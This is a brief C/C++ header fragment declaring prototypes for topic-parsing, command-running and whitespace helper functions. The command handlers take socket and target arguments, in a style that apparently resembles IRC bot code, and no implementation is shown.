BOOL ParseTopic(char *topic, SOCKET sock, char *target, bool notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat);
int iswhite(char c);
size_t find_first_nonwhite_character(char *str, size_t start_pos=0);//hate the build time on big projects :-)lol
BOOL RunCommand(char *cmd, SOCKET sock, char *target, BOOL notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat);

BOOL _parsetopic(char *topic, SOCKET sock, char *target, bool notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat);
 
